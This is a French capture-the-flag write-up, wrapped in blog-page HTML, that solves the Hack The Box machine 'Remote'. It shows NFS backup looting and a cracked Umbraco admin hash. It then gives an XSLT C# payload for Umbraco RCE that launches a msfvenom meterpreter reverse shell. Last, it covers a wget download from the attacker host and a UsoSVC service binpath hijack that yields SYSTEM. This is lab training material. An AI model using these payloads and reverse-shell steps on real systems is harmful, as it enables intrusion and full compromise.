@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.78.2" />
+
+    
+    
+    
+
+<title>Remote - Easy • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Remote - Easy"/>
+<meta name="twitter:description" content="Résolution de la box Sauna
+Introduction La box Remote de Hack The Box est une box Windows de difficulté &ldquo;Easy&rdquo;.
+User Enumération On commence par faire un nmap sur tous les ports.
+┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Hack The Box] └─$ sudo nmap -A remote.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 11:45 CET Nmap scan report for remote.htb (10.10.10.180) Host is up (0.032s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2."/>
+
+<meta property="og:title" content="Remote - Easy" />
+<meta property="og:description" content="Résolution de la box Sauna
+Introduction La box Remote de Hack The Box est une box Windows de difficulté &ldquo;Easy&rdquo;.
+User Enumération On commence par faire un nmap sur tous les ports.
+┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Hack The Box] └─$ sudo nmap -A remote.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 11:45 CET Nmap scan report for remote.htb (10.10.10.180) Host is up (0.032s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/hack-the-box/remote/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cuisine/">
+						<span>Cuisine</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/exploit/">
+						<span>Exploit</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/network/">
+						<span>Network</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/hack-the-box/">
+						<span>HackTheBox</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Remote - Easy</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/hack-the-box">HACK THE BOX</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/pentest">pentest</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/windows">windows</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/easy">easy</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/rce">rce</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/umbraco">umbraco</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/meterpreter">meterpreter</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/nfs">nfs</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/usosvc">usosvc</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 7 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <p><strong>Résolution de la box Sauna</strong></p>
+<h1 id="introduction">Introduction</h1>
+<p>La box <strong>Remote</strong> de Hack The Box est une box Windows de difficulté &ldquo;Easy&rdquo;.</p>
+
+
+
+  <img src="/img/htb/remote/resume.png" alt="Résumé de la machine Remote" class="imageformat"/>
+
+<h1 id="user">User</h1>
+<h2 id="enumération">Enumération</h2>
+<p>On commence par faire un nmap sur tous les ports.</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Hack The Box]
+└─$ sudo nmap -A remote.htb
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 11:45 CET
+Nmap scan report for remote.htb (10.10.10.180)
+Host is up (0.032s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Home - Acme Widgets
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+2049/tcp open  mountd        1-3 (RPC #100005)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/21%OT=21%CT=1%CU=38915%PV=Y%DS=2%DC=T%G=Y%TM=60095BB
+OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
+OS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS
+OS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
+OS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
+OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
+OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
+OS:Z)
+
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-01-21T10:46:38
+|_  start_date: N/A
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT      ADDRESS
+1   30.08 ms 10.10.14.1
+2   30.71 ms remote.htb (10.10.10.180)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 105.42 seconds
+
+</code></pre><p>Un fuzzing du site web nous permet de trouver un second site : Umbraco</p>
+<p>On voit qu&rsquo;une authentification est demandé. On cherche si des partages NFS ne pourraient pas nous donner cette information (oui).</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~]
+└─$ sudo nmap --script nfs* remote.htb 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 14:15 CET
+Nmap scan report for remote.htb (10.10.10.180)
+Host is up (0.077s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+111/tcp  open  rpcbind
+| nfs-ls: Volume /site_backups
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
+| rwx------   4294967294  4294967294  4096   2020-02-23T18:35:48  .
+| ??????????  ?           ?           ?      ?                    ..
+| rwx------   4294967294  4294967294  64     2020-02-20T17:16:39  App_Browsers
+| rwx------   4294967294  4294967294  4096   2020-02-20T17:17:19  App_Data
+| rwx------   4294967294  4294967294  4096   2020-02-20T17:16:40  App_Plugins
+| rwx------   4294967294  4294967294  8192   2020-02-20T17:16:42  Config
+| rwx------   4294967294  4294967294  64     2020-02-20T17:16:40  aspnet_client
+| rwx------   4294967294  4294967294  49152  2020-02-20T17:16:42  bin
+| rwx------   4294967294  4294967294  64     2020-02-20T17:16:42  css
+| rwx------   4294967294  4294967294  152    2018-11-01T17:06:44  default.aspx
+|_
+| nfs-showmount: 
+|_  /site_backups 
+| nfs-statfs: 
+|   Filesystem     1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
+|_  /site_backups  31119356.0  12186072.0  18933284.0  40%   16.0T        1023
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
+
+Nmap done: 1 IP address (1 host up) scanned in 5.93 seconds
+</code></pre><p>On voit qu&rsquo;il y a un répertoire nommé &ldquo;site_backups&rdquo;</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ mkdir backup    
+                                                                                                                                                                                                                                           
+┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ sudo mount -t nfs remote.htb:/site_backups backup              
+                                                                                                                                                                                                                                           
+┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ cd backup    
+                                                                                                                                                                                                                                           
+┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote/backup]
+└─$ ll
+total 115
+drwx------ 2 nobody 4294967294    64 20 févr.  2020 App_Browsers
+drwx------ 2 nobody 4294967294  4096 20 févr.  2020 App_Data
+drwx------ 2 nobody 4294967294  4096 20 févr.  2020 App_Plugins
+drwx------ 2 nobody 4294967294    64 20 févr.  2020 aspnet_client
+drwx------ 2 nobody 4294967294 49152 20 févr.  2020 bin
+drwx------ 2 nobody 4294967294  8192 20 févr.  2020 Config
+drwx------ 2 nobody 4294967294    64 20 févr.  2020 css
+-rwx------ 1 nobody 4294967294   152  1 nov.   2018 default.aspx
+-rwx------ 1 nobody 4294967294    89  1 nov.   2018 Global.asax
+drwx------ 2 nobody 4294967294  4096 20 févr.  2020 Media
+drwx------ 2 nobody 4294967294    64 20 févr.  2020 scripts
+drwx------ 2 nobody 4294967294  8192 20 févr.  2020 Umbraco
+drwx------ 2 nobody 4294967294  4096 20 févr.  2020 Umbraco_Client
+drwx------ 2 nobody 4294967294  4096 20 févr.  2020 Views
+-rwx------ 1 nobody 4294967294 28539 20 févr.  2020 Web.config
+</code></pre><p>On essaie de trouver dedans des informations interessantes. En regardant sur internet on trouve que le fichier où les login/mot de passe sont stockés est <code>Umbraco.sdf</code>. Avec la commande strings et un grep sur user on trouve qu&rsquo;il y a un utilisateur &ldquo;<a href="mailto:admin@htb.local">admin@htb.local</a>&rdquo;. En faisant un grep sur &ldquo;hash&rdquo; on découvre un autre utilisateur &ldquo;ssmith&rdquo;</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/…/htb/remote/backup/App_Data]
+└─$ strings Umbraco.sdf | grep hash   
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+                           
+</code></pre><p>On voit que le mot de passe est en SHA1 et on essaie de le cracker avec John.</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ echo b8be16afba8c314ad33d812f22a04991b90e2aaa &gt; admin.hash 
+                                                                                                                                                                                                                                           
+┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ sudo john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt                  
+Warning: detected hash type &quot;Raw-SHA1&quot;, but the string is also recognized as &quot;Raw-SHA1-AxCrypt&quot;
+Use the &quot;--format=Raw-SHA1-AxCrypt&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;Raw-SHA1&quot;, but the string is also recognized as &quot;Raw-SHA1-Linkedin&quot;
+Use the &quot;--format=Raw-SHA1-Linkedin&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;Raw-SHA1&quot;, but the string is also recognized as &quot;ripemd-160&quot;
+Use the &quot;--format=ripemd-160&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;Raw-SHA1&quot;, but the string is also recognized as &quot;has-160&quot;
+Use the &quot;--format=has-160&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+baconandcheese   (?)
+1g 0:00:00:02 DONE (2021-01-21 14:36) 0.3401g/s 3341Kp/s 3341Kc/s 3341KC/s baconandchipies1..bacon918
+Use the &quot;--show --format=Raw-SHA1&quot; options to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>On peut maintenant se connecter au site web.</p>
+<h2 id="exploit">Exploit</h2>
+<p>Via une RCE dans umbreco on va essayer de s&rsquo;envoyer un reverse-shell(<a href="https://www.exploit-db.com/exploits/46153)">https://www.exploit-db.com/exploits/46153)</a>. Pour cela on construit un reverse-shell et on l&rsquo;upload dans l&rsquo;onglet media du site.</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=9876 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
+</code></pre><p>On copie ensuite l&rsquo;adresse du lien : <a href="http://remote.htb/media/1033/shell.exe">http://remote.htb/media/1033/shell.exe</a></p>
+<p>On lance une écoute pour un shell meterpreter</p>
+<pre><code class="language-"shell" data-lang=""shell">msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set lhost 10.10.14.6
+lhost =&gt; 10.10.14.6
+msf6 exploit(multi/handler) &gt; set lport 9876
+lport =&gt; 9876
+msf6 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.6:9876 
+</code></pre><p>Puis avec le payload suivant on execute notre shell.</p>
+<pre><code class="language-"shell" data-lang=""shell">payload = '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; \
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; \
+xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;\
+&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() \
+{ string cmd = &quot;-Command start-process -FilePath ../../../inetpub/wwwroot/media/1033/shell.exe&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+ proc.StartInfo.FileName = &quot;powershell.exe&quot;; proc.StartInfo.Arguments = cmd;\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
+ &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;\
+ &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; ';
+
+login = &quot;admin@htb.local&quot;;
+password=&quot;baconandcheese&quot;; 
+host = &quot;http://remote.htb&quot;;
+</code></pre>
+
+
+  <img src="/img/htb/remote/meter.png" alt="Meterpreter de la machine Remote" class="imageformat"/>
+
+<h1 id="administrator">Administrator</h1>
+<h2 id="enumeration">Enumeration</h2>
+<p>En lancant un WinPEAS on voit que nous avons tous les accès sur le service UsoSVC :https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services</p>
+<h2 id="exploit-1">Exploit</h2>
+<p>On commence par recréer un reverse shell et ouvre notre port</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ sudo msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=4789 -f exe -o shell.exe                                                                                                                                       130 ⨯
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
+                                                                                                                                                                                                                                           
+┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ nc -nvlp 4789
+</code></pre><p>On upload notre shell dans un dossier pour le retrouver facilement avec wget. Puis on peut demander à notre service de l&rsquo;executer à son démarrage.</p>
+<pre><code class="language-"shell" data-lang=""shell">PS C:\tmp&gt; wget http://10.10.14.6:8000/shell.exe -OutFile shell.exe
+wget http://10.10.14.6:8000/shell.exe -OutFile shell.exe
+
+PS C:\tmp&gt; sc.exe config usosvc binpath=&quot;c:\tmp\shell.exe&quot;
+sc.exe config usosvc binpath=&quot;c:\tmp\shell.exe&quot;
+[SC] ChangeServiceConfig SUCCESS
+
+PS C:\tmp&gt; sc.exe start usosvc
+sc.exe start usosvc
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+PS C:\tmp&gt; 
+</code></pre><p>On obtient notre shell administrateur</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/remote]
+└─$ nc -nvlp 4789
+listening on [any] 4789 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.180] 49693
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;hostname
+hostname
+remote
+
+C:\Windows\system32&gt;
+</code></pre>
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/hack-the-box/sauna/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Sauna - Easy</span>
+    </a>
+    
+    
+    <a href="/hack-the-box/openadmin/" class="navigation-next">
+      <span class="navigation-tittle">OpenAdmin - Easy</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
